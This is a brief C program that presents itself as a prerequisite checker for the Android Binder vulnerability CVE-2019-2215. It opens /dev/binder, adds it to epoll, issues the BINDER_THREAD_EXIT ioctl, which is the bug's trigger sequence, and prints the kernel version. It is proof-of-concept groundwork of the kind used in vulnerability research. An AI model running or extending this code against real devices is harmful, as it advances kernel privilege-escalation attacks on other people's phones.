#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include <fcntl.h>
#include <sys/ioctl.h>
#include <sys/epoll.h>
#include <linux/android/binder.h>

#define BINDER_THREAD_EXIT 0x40046208ul

int main() {
    printf("[*] Checking Binder CVE-2019-2215 prerequisites...\n");
    
    int fd = open("/dev/binder", O_RDONLY);
    if (fd < 0) {
        perror("[-] Failed to open /dev/binder");
        return 1;
    }
    printf("[+] /dev/binder opened (fd=%d)\n", fd);

    int epfd = epoll_create(1000);
    if (epfd < 0) {
        perror("[-] epoll_create failed");
        return 1;
    }
    printf("[+] epoll_create success (fd=%d)\n", epfd);

    struct epoll_event event = { .events = EPOLLIN };
    if (epoll_ctl(epfd, EPOLL_CTL_ADD, fd, &event) == 0) {
        printf("[+] LINKED: epoll_ctl(ADD, binder_fd) succeeded! This is promising.\n");
    } else {
        perror("[-] epoll_ctl(ADD, binder_fd) failed");
        // Some kernels don't support epoll on binder
    }

    // Try BINDER_THREAD_EXIT
    if (ioctl(fd, BINDER_THREAD_EXIT, 0) == 0) {
        printf("[+] BINDER_THREAD_EXIT ioctl succeeded\n");
    } else {
        // It might fail if no thread loop was started, but errno tells us if command exists
        perror("[-] BINDER_THREAD_EXIT ioctl returned error (expected)");
    }
    
    printf("[*] Kernel version check: ");
    system("uname -a");
    
    return 0;
}
